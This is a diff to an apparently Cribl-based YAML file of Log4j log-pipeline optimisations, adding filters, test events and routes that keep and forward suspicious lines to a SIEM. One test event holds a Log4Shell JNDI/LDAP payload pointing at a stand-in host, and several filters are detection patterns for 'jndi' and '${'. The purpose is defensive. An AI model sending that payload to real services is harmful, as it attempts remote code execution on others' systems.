@@ -247,21 +247,66 @@ optimizations:
     fn: Drop
     how: Debug logging left on in production is common and huge. Keep WARN and above for the SIEM, and INFO in Lake if needed. Always keep lines with ${ or jndi in them, whatever the level.
     expr: "['DEBUG','TRACE'].includes(level) && !/\\$\\{|jndi/i.test(message || '')"
+    stream:
+      log: PatternLayout application log
+      functions:
+        - id: drop
+          filter: (level == 'DEBUG' || level == 'TRACE') && !/\$\{|jndi/i.test(message || '')
+          description: Drop DEBUG and TRACE lines unless they contain ${ or jndi
+          conf: {}
+      test:
+        - 2026-11-12 02:14:23,001 DEBUG [http-nio-8080-exec-7] com.example.auth.LoginController - Session cache hit for user jdoe
+        - 2026-11-12 02:14:23,002 TRACE [http-nio-8080-exec-7] com.example.auth.LoginController - Header value ${jndi:ldap://203.0.113.9:1389/a}
+      expect:
+        out: 2
   - title: Merge stack traces into one event
     saving: 10–30 % (event count)
     fn: Event Breaker
     how: Break on the timestamp at line start so "at …" and "Caused by:" lines stay with their event. This avoids thousands of one-line fragments.
     expr: "breaker: /^\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2},\\d{3} /  (max event 64 KB)"
+    stream:
+      note: Not a pipeline function. On the source, add an Event Breaker ruleset with a regex breaker /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3} / and a max event size of 64 KB, so "at ..." and "Caused by:" lines stay with their event.
   - title: Suppress repeated errors
     saving: 10–40 %
     fn: Suppress
     how: A failing dependency produces the same ERROR thousands of times a minute. Keep one per logger and message per minute, with a count.
     expr: "key: `${logger}:${message}`  allow 1 / 60s  when level == 'ERROR'"
+    stream:
+      log: PatternLayout application log
+      functions:
+        - id: suppress
+          filter: level == 'ERROR'
+          description: Keep one ERROR per logger and message per minute
+          conf:
+            keyExpr: logger + ':' + message
+            allow: 1
+            suppressPeriodSec: 60
+            dropEventsMode: true
+            maxCacheSize: 50000
+            cacheIdleTimeoutPeriods: 2
+            numEventsIdleTimeoutTrigger: 10000
+      test:
+        - 2026-11-12 02:14:24,100 ERROR [http-nio-8080-exec-3] com.example.db.Pool - Connection refused to db.example.com:5432
+        - 2026-11-12 02:14:24,200 ERROR [http-nio-8080-exec-4] com.example.db.Pool - Connection refused to db.example.com:5432
+        - 2026-11-12 02:14:24,300 ERROR [http-nio-8080-exec-5] com.example.db.Pool - Connection refused to db.example.com:5432
+      expect:
+        out: 2
   - title: Route by value
     saving: SIEM licence
     fn: Routes
     how: Lines with payload markers, auth loggers, WARN+ → SIEM; INFO operational chatter → Cribl Lake.
     expr: "/\\$\\{|jndi|classLoader/i.test(message) || ['WARN','ERROR','FATAL'].includes(level) → SIEM  |  else → Lake"
+    stream:
+      routes:
+        - name: Log4j payload markers and WARN+ → SIEM
+          filter: /\$\{|jndi|classLoader/i.test(_raw) || /^\S+ \S+ (WARN|ERROR|FATAL)\s/.test(_raw) || /"log\.level":"(WARN|ERROR|FATAL)"/.test(_raw)
+          to: The SIEM, full fidelity
+          final: true
+        - name: Log4j other lines → Lake
+          filter: 'true'
+          to: Cribl Lake
+          final: true
+      note: Routes see the raw event, so they match the level after the timestamp or the log.level JSON key. Put the SIEM route first.
 references:
   - title: Apache Log4j security vulnerabilities
     url: https://logging.apache.org/security.html
